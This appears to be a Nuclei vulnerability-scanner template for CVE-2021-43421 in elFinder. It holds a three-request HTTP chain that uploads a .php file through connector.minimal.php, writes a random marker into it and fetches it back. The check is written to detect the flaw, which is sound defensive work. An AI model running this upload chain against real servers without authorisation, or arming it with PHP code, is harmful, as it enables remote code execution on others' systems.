http:
- extractors:
  - group: 1
    internal: true
    name: hash
    regex:
    - '"hash"\:"(.*?)"\,'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_3, "{{randstr_1}}")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name={{randstr}}.php:aaa
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  - 'GET /elFinder/php/connector.minimal.php?cmd=put&target={{hash}}&content={{randstr_1}}
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /elfinder/files/{{randstr}}.php%3Aaaa?_t= HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: CVE-2021-43421
info:
  author: akincibor
  classification:
    cpe: cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-43421
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98888
    epss-score: 0.7657
  description: 'Studio-42 elFinder 2.0.4 to 2.1.59 is vulnerable to unauthenticated
    file upload via connector.minimal.php which could allow a remote user to upload
    arbitrary files and execute PHP code.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    upload malicious files to the server and execute arbitrary code.

    '
  metadata:
    max-request: 3
    product: elfinder
    vendor: std42
    verified: true
  name: Studio-42 elFinder <2.1.60 - Arbitrary File Upload
  reference:
  - https://github.com/Studio-42/elFinder/issues/3429
  - https://twitter.com/infosec_90/status/1455180286354919425
  - https://nvd.nist.gov/vuln/detail/CVE-2021-43421
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of Studio-42 elFinder plugin (2.1.60
    or higher) to mitigate this vulnerability.

    '
  severity: critical
  tags: cve,cve2021,elfinder,fileupload,rce,intrusive,std42,vuln
